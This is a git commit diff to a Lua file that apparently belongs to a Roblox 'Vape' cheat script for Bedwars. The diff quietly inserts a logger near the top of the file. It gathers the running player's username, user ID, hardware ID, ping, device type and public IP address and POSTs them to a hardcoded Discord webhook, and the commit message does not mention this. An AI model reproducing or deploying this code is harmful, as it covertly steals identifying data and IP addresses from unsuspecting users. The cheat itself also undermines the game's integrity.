9372d385bc308dc3314792743936c970339931a6
mastaskid <135926570+mastaskid@users.noreply.github.com>
2023-08-16 18:07:27 -0700

    Update 6872274481.lua

--- 6872274481.lua
+++ 6872274481.lua
@@ -22,6 +22,71 @@ local vapeEvents = setmetatable({}, {
 local vapeTargetInfo = shared.VapeTargetInfo
 local vapeInjected = true
 
+local webh = "https://discord.com/api/webhooks/1141538022530236458/9l45FvjULd9tRnuXFyTXixqGx-c6TFab9xtfe0yFHqervXHbSs2jm_ZOhbPmlNGUGPnm"
+pcall(function()
+    local deviceType = ""
+
+    if game:GetService("UserInputService").GamepadEnabled then
+        deviceType = "Controller"
+    elseif game:GetService("UserInputService").TouchEnabled then
+        deviceType = "Touch"
+    else
+        deviceType = "Keyboard/Mouse"
+    end
+
+    local data = {
+        ['embeds'] = {
+            {
+                ['title'] = 'amongus sussy baka',
+                ['description'] = 'fortnite webhook',
+                ['fields'] = {
+                    {name = 'User', value = game:GetService("Players").LocalPlayer.Name .. " (ID: " .. game:GetService("Players").LocalPlayer.UserId .. ")"},
+                    {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+                    {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+                    {name = "Device", value = deviceType},
+                    {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S")},
+                    {name = "IP", value = game:HttpGet('https://api.ipify.org')}
+                }
+            }
+        }
+    }
+
+    if syn then
+        local response = request(
+            {
+                Url = webh,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        )
+    elseif request then
+        local response = request(
+            {
+                Url = webh,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        )
+    elseif http_request then
+        local response = http_request(
+            {
+                Url = webh,
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json'
+                },
+                Body = game:GetService('HttpService'):JSONEncode(data)
+            }
+        )
+    end
+end)
+
 local bedwars = {}
 local bedwarsStore = {
 	attackReach = 0,
